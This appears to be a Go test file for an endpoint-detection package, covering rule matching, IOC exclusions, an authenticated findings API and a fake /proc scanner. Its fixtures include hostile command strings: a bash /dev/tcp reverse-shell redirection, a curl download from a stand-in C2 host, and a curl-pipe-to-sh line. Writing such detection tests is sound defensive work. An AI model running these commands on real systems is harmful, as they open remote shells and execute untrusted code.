package edr

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestDetect(t *testing.T) {
	e := Event{Time: time.Now(), Host: "lab", PID: 12, Executable: "/usr/bin/bash", Command: "bash -c 'echo x >/dev/tcp/127.0.0.1/4444'"}
	f := Detect(e)
	if len(f) < 1 {
		t.Fatalf("expected findings, got none")
	}
	found := false
	for _, x := range f {
		if x.Rule == "shell-network-redirection" {
			found = true
		}
	}
	if !found {
		t.Fatalf("missing shell-network-redirection in %+v", f)
	}
	e.Command = "bash -c 'echo hello'"
	if len(Detect(e)) != 0 {
		t.Fatal("false positive")
	}
}

func TestDetectIOCIOAExclusion(t *testing.T) {
	e := Event{Time: time.Now(), Host: "lab", PID: 9, Executable: "/usr/bin/curl", Command: "curl http://evil-c2.example/payload"}
	f := Detect(e)
	iocHit := false
	for _, x := range f {
		if strings.HasPrefix(x.Rule, "ioc-") {
			iocHit = true
		}
	}
	if !iocHit {
		t.Fatalf("expected IOC match, got %+v", f)
	}
	worldMu.Lock()
	exclusions = append(exclusions, map[string]any{"pattern": "ioc-domain", "reason": "test"})
	worldMu.Unlock()
	t.Cleanup(func() {
		worldMu.Lock()
		exclusions = nil
		worldMu.Unlock()
	})
	f2 := Detect(e)
	for _, x := range f2 {
		if strings.HasPrefix(x.Rule, "ioc-") {
			t.Fatalf("exclusion failed: %+v", f2)
		}
	}
}
func TestStoreAndAPI(t *testing.T) {
	path := filepath.Join(t.TempDir(), "f.jsonl")
	s, err := testStore(t, path, 10)
	if err != nil {
		t.Fatal(err)
	}
	token := "0123456789abcdef"
	server := httptest.NewServer(API(token, s))
	defer server.Close()
	payload := `{"time":"2026-11-12T00:00:00Z","host":"test","pid":14,"executable":"/usr/bin/curl","command":"curl -fsSL https://example.invalid/a | sh"}`
	req, _ := http.NewRequest("POST", server.URL+"/v1/events", strings.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+token)
	r, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	r.Body.Close()
	if r.StatusCode != 200 {
		t.Fatalf("status %d", r.StatusCode)
	}
	if len(s.List()) != 1 {
		t.Fatalf("findings: %+v", s.List())
	}
	next, err := testStore(t, path, 10)
	if err != nil || len(next.List()) != 1 {
		t.Fatalf("persist: %v", err)
	}
	r, err = http.Get(server.URL + "/v1/findings")
	if err != nil {
		t.Fatal(err)
	}
	r.Body.Close()
	if r.StatusCode != 401 {
		t.Fatal("unauthenticated read was allowed")
	}
	var z []Finding
	b, _ := os.ReadFile(path)
	if err = json.Unmarshal([]byte(strings.TrimSpace(string(b))), &Finding{}); err != nil {
		t.Fatal(err)
	}
	_ = z
}
func TestScannerFakeProc(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, "123")
	if err := os.Mkdir(dir, 0700); err != nil {
		t.Fatal(err)
	}
	stat := "123 (some process) S 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 42 0 0"
	os.WriteFile(filepath.Join(dir, "stat"), []byte(stat), 0600)
	os.WriteFile(filepath.Join(dir, "cmdline"), []byte("echo\x00hi\x00"), 0600)
	os.WriteFile(filepath.Join(dir, "status"), []byte("Uid:\t1000\t1000\t1000\t1000\n"), 0600)
	s := NewScanner(root, "host")
	if len(s.Scan(time.Now())) != 1 {
		t.Fatal("expected first process")
	}
	if len(s.Scan(time.Now())) != 0 {
		t.Fatal("duplicate process")
	}
}
